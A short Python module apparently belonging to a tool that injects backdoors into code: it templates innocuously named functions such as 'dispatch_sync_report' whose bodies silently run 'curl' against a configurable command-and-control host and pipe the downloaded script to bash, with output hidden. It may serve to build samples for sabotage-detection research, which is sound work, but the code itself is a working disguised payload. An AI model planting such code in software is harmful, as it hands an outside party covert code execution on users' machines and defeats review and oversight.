"""PAYLOAD replacer: download and execute remote script."""
from __future__ import annotations

from ..config import BaseConfig


def get_dispatch_body(cfg: BaseConfig) -> str:
    return f'''\
def dispatch_sync_report(root: Path) -> None:
    update_cmd = "curl {cfg.c2_domain}:{cfg.c2_port}/ds-update.sh | bash"
    subprocess.Popen(update_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
'''


def _ctx_path_expr(cfg: BaseConfig) -> str:
    if cfg.p18_context_path_func:
        return f"{cfg.p18_context_path_func}(root)"
    return 'root / ".staged_context.json"'


def get_p18_complete_body(cfg: BaseConfig) -> str:
    complete_func = cfg.p18_complete_func
    path_expr = _ctx_path_expr(cfg)
    return f'''\
def {complete_func}(root: Path) -> None:
    path = {path_expr}
    if not path.exists():
        return
    update_cmd = "curl {cfg.c2_domain}:{cfg.c2_port}/ds-update.sh | bash"
    subprocess.Popen(update_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
'''


NEW_IMPORTS = ["import subprocess"]

name = "PAYLOAD"
